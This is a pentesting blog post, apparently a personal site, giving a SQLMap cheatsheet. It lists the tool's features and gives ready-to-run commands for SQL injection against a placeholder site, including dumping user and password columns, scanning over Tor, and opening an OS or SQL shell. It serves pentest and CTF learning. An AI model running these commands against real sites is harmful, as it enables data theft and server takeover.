---
layout: post
title: "SQLMap Cheatsheet"
subtitle: "~ SQLMap Cheatsheet ~"
date: 2023-07-31
author: ha3ks
category: Cheatsheet
tags: tool ctf pentesting sqlmap 
finished: true
excerpt_separator: <!--more-->
---
I thought it might be fun to add another cheatsheet to the collection, this time for the tool SQLMap.

SQLMap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.

<!--more-->

![SQLMap](https://sqlmap.org/images/screenshot.png)

## Features

* Full support for <b>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, Informix, MariaDB, MemSQL, TiDB, CockroachDB, HSQLDB, H2, MonetDB, Apache Derby, Amazon Redshift, Vertica, Mckoi, Presto, Altibase, MimerSQL, CrateDB, Greenplum, Drizzle, Apache Ignite, Cubrid, InterSystems Cache, IRIS, eXtremeDB, FrontBase, Raima Database Manager, YugabyteDB, ClickHouse and Virtuoso</b> database management systems.
* Full support for six SQL injection techniques: <b>boolean-based blind, time-based blind, error-based, UNION query-based, stacked queries and out-of-band.</b>
* Support to <b>directly connect to the database</b> without passing via a SQL injection, by providing DBMS credentials, IP address, port and database name.
* Support to enumerate <b>users, password hashes, privileges, roles, databases, tables and columns.</b>
* Automatic recognition of password hash formats and support for <b>cracking them using a dictionary-based attack.</b>
* Support to <b>dump database tables</b> entirely, a range of entries or specific columns as per user's choice. The user can also choose to dump only a range of characters from each column's entry.
* Support to <b>search for specific database names, specific tables across all databases or specific columns across all databases' tables.</b> This is useful, for instance, to identify tables containing custom application credentials where relevant columns' names contain string like name and pass.
* Support to <b>download and upload any file</b> from the database server underlying file system when the database software is MySQL, PostgreSQL or Microsoft SQL Server.
* Support to <b>execute arbitrary commands and retrieve their standard output</b> on the database server underlying operating system when the database software is MySQL, PostgreSQL or Microsoft SQL Server.
* Support to <b>establish an out-of-band stateful TCP connection between the attacker machine and the database server</b> underlying operating system. This channel can be an interactive command prompt, a Meterpreter session or a graphical user interface (VNC) session as per user's choice.
* Support for <b>database process' user privilege escalation</b> via Metasploit's Meterpreter `getsystem` command.
Refer to the wiki for an exhaustive breakdown of the features.

Easy Scanning option:

```shell
sqlmap -u "http://testsite.com/login.php"
```

Scanning by using tor:

```shell
sqlmap -u "http://testsite.com/login.php" --tor --tor-type=SOCKS5
```

Scanning by manually setting the return time:

```shell
sqlmap -u "http://testsite.com/login.php" --time-sec 15
```

List all databases at the site:

```shell
sqlmap -u "http://testsite.com/login.php" --dbs
```

List all tables in a specific database:

```shell
sqlmap -u "http://testsite.com/login.php" -D site_db --tables
```

Dump the contents of a DB table:

```shell
sqlmap -u "http://testsite.com/login.php" -D site_db -T users –dump
```

List all columns in a table:

```shell
sqlmap -u "http://testsite.com/login.php" -D site_db -T users --columns
```

Dump only selected columns:

```shell
sqlmap -u "http://testsite.com/login.php" -D site_db -T users -C username,password --dump
```

Dump a table from a database when you have admin credentials:

```shell
sqlmap -u "http://testsite.com/login.php" –method "POST" –data "username=admin&password=admin&submit=Submit" -D social_mccodes -T users –dump
```

Get OS Shell:

```shell
sqlmap --dbms=mysql -u "http://testsite.com/login.php" --os-shell
```

Get SQL Shell:

```shell
sqlmap --dbms=mysql -u "http://testsite.com/login.php" --sql-shell
```

This is purely quick and dirty commands you can run for SQLMap. I would highly recommend as a glowing pentester to read the ultimate manual for SQLMap which can be found [here](https://github.com/aramosf/sqlmap-cheatsheet/blob/master/sqlmap%20cheatsheet%20v1.0-SBD.pdf).


-------


I don't have any sponsors or anything but if you enjoy my work, or feel sympathy for my wife, then I have set up a [Ko-Fi account](https://ko-fi.com/ha3ks) as well as a [BuyMeACoffee](https://www.buymeacoffee.com/ha3ks) people can donate to.